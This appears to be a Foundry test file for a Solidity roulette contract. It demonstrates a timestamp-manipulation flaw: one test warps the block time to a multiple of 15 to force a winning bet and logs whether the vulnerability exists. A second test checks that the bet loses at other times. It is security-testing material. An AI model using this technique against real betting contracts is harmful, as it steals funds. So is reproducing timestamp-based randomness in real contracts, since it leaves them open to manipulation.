// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/roulette.sol";

contract RouletteTest is Test {
    Roulette roulette;
    address player = address(0x123);
    address owner = address(0x456);

    function setUp() public {
        // Fund the owner account first
        vm.deal(owner, 100 ether);
        
        // Deploy the roulette contract with some initial funds
        vm.prank(owner);
        roulette = new Roulette{value: 100 ether}();
        
        // Fund the player account
        vm.deal(player, 100 ether);
    }

    function testTimeManipulation() public {
        // Start a fresh block context
        vm.startPrank(owner);
        roulette.withdrawOwnerShare();
        vm.stopPrank();

        console.log("--- BEFORE: Player Stats ---");
        uint256 prevTotalWinners = roulette.totalWinners();
        uint256 prevPlayerWins = roulette.playerWins(player);
        console.log("Prev Total Winners: %s", prevTotalWinners);
        console.log("Prev Player Wins: %s", prevPlayerWins);

        // Simulate miner manipulating the timestamp to be divisible by 15
        uint256 manipulatedTime = block.timestamp - (block.timestamp % 15);
        if (manipulatedTime == 0) manipulatedTime = 15; // Ensure non-zero
        
        // Warp to manipulated time in a new block
        vm.roll(block.number + 1);
        vm.warp(manipulatedTime);
        
        console.log("--- Trigger PlaceBet ---");
        // Player places bet
        vm.prank(player);
        roulette.placeBet{value: 10 ether}();
        
        console.log("--- AFTER: Player Stats ---");
        uint256 newTotalWinners = roulette.totalWinners();
        uint256 newPlayerWins = roulette.playerWins(player);
        console.log("New Total Winners: %s", newTotalWinners);
        console.log("New Player Wins: %s", newPlayerWins);
        
        // Verify state changes
        bool winOccurred = (newTotalWinners != prevTotalWinners) || 
                           (newPlayerWins != prevPlayerWins);
        
        // Original verifications
        assertEq(roulette.totalWinners(), 1);
        assertEq(player.balance, 100 ether - 10 ether + 100 ether);
        
        // Vulnerability verdict
        if (winOccurred) {
            console.log("Vulnerability Exists: Miner manipulated timestamp to force win condition");
        } else {
            console.log("Vulnerability not Exist: Timestamp manipulation did not affect the outcome");
        }
    }

    function testNormalOperation() public {
        // Start a fresh block context
        vm.startPrank(owner);
        roulette.withdrawOwnerShare();
        vm.stopPrank();

        console.log("--- BEFORE: Player Stats ---");
        uint256 prevTotalWinners = roulette.totalWinners();
        uint256 prevPlayerWins = roulette.playerWins(player);
        console.log("Prev Total Winners: %s", prevTotalWinners);
        console.log("Prev Player Wins: %s", prevPlayerWins);

        // Get timestamp that's not divisible by 15
        uint256 normalTime = block.timestamp;
        if (normalTime % 15 == 0) {
            normalTime += 1;
        }
        
        // Warp to normal time in a new block
        vm.roll(block.number + 1);
        vm.warp(normalTime);
        
        console.log("--- Trigger PlaceBet ---");
        // Player places bet
        vm.prank(player);
        roulette.placeBet{value: 10 ether}();
        
        console.log("--- AFTER: Player Stats ---");
        uint256 newTotalWinners = roulette.totalWinners();
        uint256 newPlayerWins = roulette.playerWins(player);
        console.log("New Total Winners: %s", newTotalWinners);
        console.log("New Player Wins: %s", newPlayerWins);

        // Verify player didn't win
        assertEq(roulette.totalWinners(), 0);
        assertEq(player.balance, 100 ether - 10 ether);
    }
}